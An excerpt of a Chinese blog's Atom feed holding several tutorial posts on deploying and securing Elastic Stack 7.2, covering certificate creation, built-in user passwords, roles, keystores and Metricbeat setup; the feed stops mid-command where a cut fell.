      &lt;!-- build time:Tue Dec 31 2019 15:01:50 GMT+0800 (GMT+08:00) --&gt;&lt;p&gt;本章节的配置内容，是建立在成功部署和配置了前面几个章节的基础之上。&lt;/p&gt;&lt;h2 id=&quot;制作数字证书&quot;&gt;&lt;a href=&quot;#制作数字证书&quot; class=&quot;headerlink&quot; title=&quot;制作数字证书&quot;&gt;&lt;/a&gt;制作数字证书&lt;/h2&gt;&lt;p&gt;在一个安全的集群中，Elasticsearch节点在与其他节点通信时会使用证书来标识自己。&lt;br&gt;群集必须验证这些证书的真实性。 建议的方法是信任特定的证书颁发机构（CA）。 因此，当节点添加到群集时，需要他们使用由同一CA签名的证书。&lt;/p&gt;&lt;p&gt;制作ca证书：&lt;br&gt;&lt;/p&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;./bin/elasticsearch-certutil ca&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;使用默认输出文件名elastic-stack-ca.p12，并为证书设置访问口令：my-elastic123。如果是你的生产集群，请注意做好证书和口令的保护。&lt;br&gt;创建一个目录用于存放证书：&lt;br&gt;&lt;/p&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;cd $&amp;#123;ES_HOME&amp;#125;/config&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;mkdir certs&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;为节点1制作证书和密钥：&lt;br&gt;&lt;/p&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;./bin/elasticsearch-certutil cert --ca elastic-stack-ca.p12 --ip 10.20.0.11 --out config/certs/es-node1.p12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;输入ca的口令，并为节点1的证书设置口令为：es-node123&lt;/li&gt;&lt;li&gt;elasticsearch-certutil工具提供了更多复杂的证书管理功能，如果有使用需求可以参见：&lt;a href=&quot;https://www.elastic.co/guide/en/elasticsearch/reference/7.2/certutil.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.elastic.co/guide/en/elasticsearch/reference/7.2/certutil.html&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
    
    </summary>
    
      <category term="elk" scheme="https://yongnights.github.io/categories/elk/"/>
    
    
      <category term="elk" scheme="https://yongnights.github.io/tags/elk/"/>
    
  </entry>
  
  <entry>
    <title>elastic stack 7.2技术栈【四】在单机版es技术栈之上启用和配置es安全管理功能</title>
    <link href="https://yongnights.github.io/2019/12/31/elastic%20stack%207.2%E6%8A%80%E6%9C%AF%E6%A0%88%E3%80%90%E5%9B%9B%E3%80%91%E2%80%94%E2%80%94%20%E5%9C%A8%E5%8D%95%E6%9C%BA%E7%89%88es%E6%8A%80%E6%9C%AF%E6%A0%88%E4%B9%8B%E4%B8%8A%E5%90%AF%E7%94%A8%E5%92%8C%E9%85%8D%E7%BD%AEes%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E5%8A%9F%E8%83%BD/"/>
    <id>https://yongnights.github.io/2019/12/31/elastic stack 7.2技术栈【四】—— 在单机版es技术栈之上启用和配置es安全管理功能/</id>
    <published>2019-12-31T06:51:26.169Z</published>
    <updated>2019-12-31T06:59:34.772Z</updated>
    
    <content type="html"><![CDATA[<!-- build time:Tue Dec 31 2019 15:01:50 GMT+0800 (GMT+08:00) --><p>Elasticsearch安全功能使得可以轻松保护群集。 可以对数据进行基础的密码保护，并实施更高级的安全措施，例如加密通信，基于角色的访问控制，IP过滤和审计。<br>在最新发行的es和kinaba版本中，basic级别的许可中已经开放了部分安全管理的功能特性，可以免费使用。详细信息参见：<a href="https://www.elastic.co/subscriptions" target="_blank" rel="noopener">https://www.elastic.co/subscriptions</a></p><ol><li><p>依次停止Metricbeat、kibana和elasticsearch服务进程</p></li><li><p>编辑ES_PATH_CONF/elasticsearch.yml文件，启用xpack服务<br>添加以下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xpack.security.enabled: true</span><br></pre></td></tr></table></figure></li><li><p>编辑ES_PATH_CONF/elasticsearch.yml文件，启用 single-node discovery功能</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">discovery.type: single-node</span><br></pre></td></tr></table></figure></li></ol><p>通过将discovery.type设置为single-node， 在这种情况下，节点将选择自己作为主节点，并且不会加入任何其他节点的集群。</p><p>启用Elasticsearch安全功能后，默认情况下会启用基本身份验证。 要与群集通信，必须指定用户名和密码。 除非启用了匿名访问，否则所有不包含用户名和密码的请求都将被拒绝。</p><a id="more"></a><ol start="4"><li>为内置用户创建密码<br>有一些管理用途的集群内建用户，如apm_system, beats_system, elastic, kibana, logstash_system, and remote_monitoring_user，我们需要为其设置密码。<br>这些内建管理用户的说明信息参见： <a href="https://www.elastic.co/guide/en/elastic-stack-overview/7.2/built-in-users.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elastic-stack-overview/7.2/built-in-users.html</a></li></ol><p>启动es服务：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bin/elasticsearch</span><br></pre></td></tr></table></figure><p></p><p>执行下面命令设置内建管理用户的密码：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bin/elasticsearch-setup-passwords interactive</span><br></pre></td></tr></table></figure><p></p><p>这里设置的账号密码，在后续各种服务集成配置中会使用到，所以务必做好记录。该命令仅可以执行一次。<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">elastic/elastic123</span><br><span class="line">apm_system/apm_system123</span><br><span class="line">kibana/kibana123</span><br><span class="line">logstash_system/logstash_system123</span><br><span class="line">beats_system/beats_system123</span><br><span class="line">remote_monitoring_user/remote_monitoring_user123</span><br></pre></td></tr></table></figure><p></p><ol start="5"><li>账号与密码信息的管理<br>这里又有两种方式进行配置，一个是直接将账号/密码维护在配置文件中。另一个方法是，把账号/密码存储到keystore密钥库中。后一种的安全性更高些。<br>编辑 KIBANA_HOME/config/kibana.yml ：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">elasticsearch.username: &quot;kibana&quot;</span><br><span class="line">elasticsearch.password: &quot;kibana123&quot;</span><br></pre></td></tr></table></figure></li></ol><p>或者存储在keystore中：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 放置历史操作记录被查看到</span><br><span class="line">set +o history</span><br><span class="line">export LOGSTASH_KEYSTORE_PASS=mypassword </span><br><span class="line">set -o history</span><br><span class="line"></span><br><span class="line">./bin/kibana-keystore create</span><br><span class="line">./bin/kibana-keystore add elasticsearch.username</span><br><span class="line">./bin/kibana-keystore add elasticsearch.password</span><br></pre></td></tr></table></figure><p></p><p>在提示输入时，根据提示输入kibana/kibana123的用户名和密码信息。该账号将被用于kibana访问es服务时使用。<br>启动kibana服务：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bin/kibana</span><br></pre></td></tr></table></figure><p></p><p>现在我们已经设置好了内置用户，需要决定如何管理所有其他用户。</p><p>Elastic Stack对用户进行身份验证以确保它们有效。 身份验证过程由realm进行处理。 可以使用一个或多个内置realm，例如native，file，LDAP，PKI，Active Directory，SAML或Kerberos realm。 也可以创建自己的自定义realm。 在本教程中，我们将使用本机native realm，这也是basic许可所允许免费使用的用户身份验证方式之一。</p><p>通常，可以通过在elasticsearch.yml文件中添加xpack.security.authc.realm设置来配置realm。 但是，如果未配置其他域，则默认情况下为使用本机native realm。 因此，无需在本教程中执行任何额外的配置步骤，就可以直接跳转到创建用户了！</p><ol start="6"><li>创建用户<br>我们创建两个基于native realm的用户。</li></ol><p>使用浏览器打开kibana服务地址，会发现此时已经需要登录才能使用kibana服务了。<br>1）使用elastic/elastic123账号，登录进入kibana。<br>2）转到Management / Security / Users页面。<br>3）点击Create new user，创建一个账号gqtest/gqtest123，但暂时先不设置Roles，该账号将作为查看kibana的个人账号使用。<br>4）再创建一个logstash_internal/logstash_internal123用户，用于logstash向es写入数据时使用。</p><p><img src="https://img-blog.csdnimg.cn/20190716170928851.png" alt></p><p>5）配置角色授权<br>每个角色定义一组特定的操作（如读取，创建或删除），这些操作可以在特定的安全资源（例如索引，别名，文档，字段或集群）上执行。 es已经提供了很多内置角色可以直接使用。</p><p>打开Management / Security / Roles页面，查看系统内置的各种Roles。点击某个角色的名称，可以查看该角色都被授予了哪些权限。</p><p>我们将kibana_user角色分配给你的用户。 返回Management / Security / Users页面并选择你的用户。 添加kibana_user角色并保存更改。该角色将提供kibana的所有使用权限。</p><p>在实际使用中，我们可能需要为特定的用户创建专用的kibana账号，仅显示部分kibana功能菜单，同时控制各菜单项的读、写权限。这些可以通过在kibana上自定义Role角色来实现。<br>详情配置方法参见：<a href="https://www.elastic.co/guide/en/kibana/7.2/kibana-role-management.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/kibana/7.2/kibana-role-management.html</a></p><p>在前面配置步骤中，我们在Elasticsearch中存储Metricbeat数据。 让我们创建两个角色，授予对该数据的不同级别的访问权限。<br>转到Management / Security / Roles页面，然后单击Create role。</p><p>创建一个metricbeat_reader角色，该角色对metricbeat- <em>索引具有read和view_index_metadata特权：<br>创建一个metricbert_writer角色，该角色具有manage_index_templates的权限并监视集群特权，以及对metricbeat- </em>索引的write, delete, create_index, manage的特权：<br>Role metricbert_writer：</p><p><img src="https://img-blog.csdnimg.cn/20190716170949577.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhdGVybWVsb25iaWc=,size_16,color_FFFFFF,t_70" alt></p><p>现在返回Management / Security / Users页面并将这些角色分配给适当的用户。 将metricbeat_reader角色分配给你的个人用户。 将metricbeat_writer角色分配给logstash_internal用户。</p><p>如果需要了解更多的授权和角色管理知识，请参见：<a href="https://www.elastic.co/guide/en/elastic-stack-overview/7.2/authorization.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elastic-stack-overview/7.2/authorization.html</a></p><p>6）配置Logstash或Metricbeat使用es账号<br>Logstash的配置方法参见：<a href="https://www.elastic.co/guide/en/elastic-stack-overview/7.2/get-started-logstash-user.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elastic-stack-overview/7.2/get-started-logstash-user.html</a></p><p>Metricbeat配置使用es账号</p><p>创建一个keystore密钥库：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./metricbeat keystore create</span><br></pre></td></tr></table></figure><p></p><p>将敏感的密码信息存放在密钥库里：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./metricbeat keystore add ES_PWD</span><br></pre></td></tr></table></figure><p></p><p>使用账号metricbeat_internal/metricbeat_internal123，将其密码信息保存于keystore中的ES_PWD变量中。<br>metricbeat_internal是我们创建的一个用户，授予了beats_system, kibana_user，metricbert_writer这3个角色权限。<br>查看与删除的方法：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./metricbeat keystore list</span><br><span class="line">./metricbeat keystore remove ES_PWD</span><br></pre></td></tr></table></figure><p></p><p>编辑metricbeat.yml配置文件：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">setup.kibana:</span><br><span class="line">  host: &quot;es-node1:5601&quot;</span><br><span class="line">  username: &quot;metricbeat_internal&quot;</span><br><span class="line">  password: &quot;$&#123;ES_PWD&#125;&quot;</span><br><span class="line"></span><br><span class="line">#-------------------------- Elasticsearch output ------------------------------</span><br><span class="line">output.elasticsearch:</span><br><span class="line">  # Array of hosts to connect to.</span><br><span class="line">  hosts: [&quot;localhost:9200&quot;]</span><br><span class="line">  # Optional protocol and basic auth credentials.</span><br><span class="line">  #protocol: &quot;https&quot;</span><br><span class="line">  username: &quot;beats_system&quot;</span><br><span class="line">  password: &quot;$&#123;ES_PWD&#125;&quot;</span><br></pre></td></tr></table></figure><p></p><p>启动Metricbeat服务：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./metricbeat -e</span><br></pre></td></tr></table></figure><p></p><p>回到kibana的web页面，使用之前创建的gqtest/gqtest123账号登录并查看系统指标数据，该账号具有metricbeat_reader 和 kibana_user的授权。<br>可以看到Metricbeat采集的系统指标数据正常写入elasticsearch，且在kibana上正常展示，则可以继续配置下面的步骤。</p><!-- rebuild by neat -->]]></content>
    
    <summary type="html">
    
      &lt;!-- build time:Tue Dec 31 2019 15:01:50 GMT+0800 (GMT+08:00) --&gt;&lt;p&gt;Elasticsearch安全功能使得可以轻松保护群集。 可以对数据进行基础的密码保护，并实施更高级的安全措施，例如加密通信，基于角色的访问控制，IP过滤和审计。&lt;br&gt;在最新发行的es和kinaba版本中，basic级别的许可中已经开放了部分安全管理的功能特性，可以免费使用。详细信息参见：&lt;a href=&quot;https://www.elastic.co/subscriptions&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.elastic.co/subscriptions&lt;/a&gt;&lt;/p&gt;&lt;ol&gt;&lt;li&gt;&lt;p&gt;依次停止Metricbeat、kibana和elasticsearch服务进程&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;编辑ES_PATH_CONF/elasticsearch.yml文件，启用xpack服务&lt;br&gt;添加以下内容：&lt;/p&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;xpack.security.enabled: true&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;编辑ES_PATH_CONF/elasticsearch.yml文件，启用 single-node discovery功能&lt;/p&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;discovery.type: single-node&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;通过将discovery.type设置为single-node， 在这种情况下，节点将选择自己作为主节点，并且不会加入任何其他节点的集群。&lt;/p&gt;&lt;p&gt;启用Elasticsearch安全功能后，默认情况下会启用基本身份验证。 要与群集通信，必须指定用户名和密码。 除非启用了匿名访问，否则所有不包含用户名和密码的请求都将被拒绝。&lt;/p&gt;
    
    </summary>
    
      <category term="elk" scheme="https://yongnights.github.io/categories/elk/"/>
    
    
      <category term="elk" scheme="https://yongnights.github.io/tags/elk/"/>
    
  </entry>
  
  <entry>
    <title>elastic stack 7.2技术栈【三】部署单机版本的elasticsearch技术栈</title>
    <link href="https://yongnights.github.io/2019/12/31/elastic%20stack%207.2%E6%8A%80%E6%9C%AF%E6%A0%88%E3%80%90%E4%B8%89%E3%80%91%E2%80%94%E2%80%94%20%E9%83%A8%E7%BD%B2%E5%8D%95%E6%9C%BA%E7%89%88%E6%9C%AC%E7%9A%84elasticsearch%E6%8A%80%E6%9C%AF%E6%A0%88/"/>
    <id>https://yongnights.github.io/2019/12/31/elastic stack 7.2技术栈【三】—— 部署单机版本的elasticsearch技术栈/</id>
    <published>2019-12-31T06:51:26.166Z</published>
    <updated>2019-12-31T06:58:40.678Z</updated>
    
    <content type="html"><![CDATA[<!-- build time:Tue Dec 31 2019 15:01:50 GMT+0800 (GMT+08:00) --><h2 id="在节点1上面安装单节点es"><a href="#在节点1上面安装单节点es" class="headerlink" title="在节点1上面安装单节点es"></a>在节点1上面安装单节点es</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -L -O https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-7.2.0-linux-x86_64.tar.gz</span><br><span class="line">tar -xzvf elasticsearch-7.2.0-linux-x86_64.tar.gz</span><br></pre></td></tr></table></figure><p>对elasticsearch.yml几个重要配置参数进行设置：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cluster.name: my-elastic</span><br><span class="line">node.name: es-node1</span><br><span class="line"># network.host: 10.20.0.11</span><br><span class="line">bootstrap.memory_lock: true</span><br></pre></td></tr></table></figure><p></p><ul><li>暂不能启用network.host参数，否则会触发es的强调集群配置检查，因为es集群配置还不完整，所以这会导致启动失败<br>启动es服务：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd elasticsearch-7.2.0</span><br><span class="line">./bin/elasticsearch</span><br></pre></td></tr></table></figure></li></ul><p>检测下服务是否正常启动：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.20.0.11:9200</span><br></pre></td></tr></table></figure><p></p><a id="more"></a><h2 id="在节点1上安装kibana"><a href="#在节点1上安装kibana" class="headerlink" title="在节点1上安装kibana"></a>在节点1上安装kibana</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -L -O https://artifacts.elastic.co/downloads/kibana/kibana-7.2.0-linux-x86_64.tar.gz</span><br><span class="line">tar xzvf kibana-7.2.0-linux-x86_64.tar.gz</span><br><span class="line">cd kibana-7.2.0-linux-x86_64/</span><br></pre></td></tr></table></figure><p>编辑config/kibana.yml文件：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">elasticsearch.hosts: [&quot;http://10.20.0.11:9200&quot;]</span><br><span class="line">server.host: &quot;es-node1&quot;</span><br></pre></td></tr></table></figure><p></p><p>启动：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bin/kibana</span><br></pre></td></tr></table></figure><p></p><p>调整防火墙放行规则：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --permanent --zone=public --add-port=5601/tcp</span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure><p></p><p>检测服务是否正常启动：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.20.0.11:5601</span><br></pre></td></tr></table></figure><p></p><h2 id="在节点1上安装Beats"><a href="#在节点1上安装Beats" class="headerlink" title="在节点1上安装Beats"></a>在节点1上安装Beats</h2><p>Beats针对不同的使用场景，分别提供了不同的工具实现。这里我们使用Metricbeat对节点主机的系统进行监控。</p><p>Metricbeat提供预构建的模块，可以使用它们快速实施和部署系统监控解决方案。<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -L -O https://artifacts.elastic.co/downloads/beats/metricbeat/metricbeat-7.2.0-linux-x86_64.tar.gz</span><br><span class="line">tar xzvf metricbeat-7.2.0-linux-x86_64.tar.gz</span><br></pre></td></tr></table></figure><p></p><p>在这里，我们将运行Metricbeat的system模块以从服务器上运行的操作系统和服务收集指标。system模块收集系统级指标，例如CPU使用率，内存，文件系统，磁盘IO和网络IO统计信息，以及系统上运行的每个进程的类似顶级的统计信息。<br>启用system模块：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./metricbeat modules enable system</span><br></pre></td></tr></table></figure><p></p><p>初始化数据：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./metricbeat setup -e</span><br></pre></td></tr></table></figure><p></p><p>如果前一步中kibana服务绑定的网卡变更为对外服务的网卡了，则在执行这个命令前请修改metricbeat.yml文件中kibana服务地址的定义。<br>启动Metricbeat服务：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./metricbeat -e</span><br></pre></td></tr></table></figure><p></p><p>要看可视化系统指标，请打开浏览器并导航到Metricbeat系统概述仪表板：<br><a href="http://10.20.0.11:5601/app/kibana#/dashboard/Metricbeat-system-overview-ecs" target="_blank" rel="noopener">http://10.20.0.11:5601/app/kibana#/dashboard/Metricbeat-system-overview-ecs</a></p><p>至此，单机版本的部署完成，在部署结果通过验收后，进入下一步骤，启用和配置出es安全管理功能。</p><!-- rebuild by neat -->]]></content>
    
    <summary type="html">
    
      &lt;!-- build time:Tue Dec 31 2019 15:01:50 GMT+0800 (GMT+08:00) --&gt;&lt;h2 id=&quot;在节点1上面安装单节点es&quot;&gt;&lt;a href=&quot;#在节点1上面安装单节点es&quot; class=&quot;headerlink&quot; title=&quot;在节点1上面安装单节点es&quot;&gt;&lt;/a&gt;在节点1上面安装单节点es&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;curl -L -O https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-7.2.0-linux-x86_64.tar.gz&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tar -xzvf elasticsearch-7.2.0-linux-x86_64.tar.gz&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;对elasticsearch.yml几个重要配置参数进行设置：&lt;br&gt;&lt;/p&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;cluster.name: my-elastic&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;node.name: es-node1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# network.host: 10.20.0.11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;bootstrap.memory_lock: true&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;暂不能启用network.host参数，否则会触发es的强调集群配置检查，因为es集群配置还不完整，所以这会导致启动失败&lt;br&gt;启动es服务：&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;cd elasticsearch-7.2.0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;./bin/elasticsearch&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;检测下服务是否正常启动：&lt;br&gt;&lt;/p&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;curl http://10.20.0.11:9200&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="elk" scheme="https://yongnights.github.io/categories/elk/"/>
    
    
      <category term="elk" scheme="https://yongnights.github.io/tags/elk/"/>
    
  </entry>
  
  <entry>
    <title>elastic stack 7.2技术栈【七】启用Metricbeat的安全性配置</title>
    <link href="https://yongnights.github.io/2019/12/31/elastic%20stack%207.2%E6%8A%80%E6%9C%AF%E6%A0%88%E3%80%90%E4%B8%83%E3%80%91%E2%80%94%E2%80%94%E5%90%AF%E7%94%A8Metricbeat%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7%E9%85%8D%E7%BD%AE/"/>
    <id>https://yongnights.github.io/2019/12/31/elastic stack 7.2技术栈【七】——启用Metricbeat的安全性配置/</id>
    <published>2019-12-31T06:51:26.163Z</published>
    <updated>2019-12-31T06:58:26.945Z</updated>
    
    <content type="html"><![CDATA[<!-- build time:Tue Dec 31 2019 15:01:50 GMT+0800 (GMT+08:00) --><p>我们使用Metricbeat采集es主机节点的系统监控指标数据，以及监控es集群中索引等服务。</p><ol><li><p>对每个es服务节点编辑elasticsearch.yml，以启用监控数据采集</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xpack.monitoring.collection.enabled: true</span><br></pre></td></tr></table></figure></li><li><p>在每个节点的metricbeat部署目录下，启用elasticsearch-xpack模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./metricbeat modules enable elasticsearch-xpack</span><br></pre></td></tr></table></figure></li></ol><a id="more"></a><ol start="3"><li>进入elasticsearch部署目录，为每个节点上的Metricbeat制作一个数字证书<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./bin/elasticsearch-certutil cert --ca elastic-stack-ca.p12 --name es-node1 --ip 10.20.0.11 --pem</span><br><span class="line">./bin/elasticsearch-certutil cert --ca 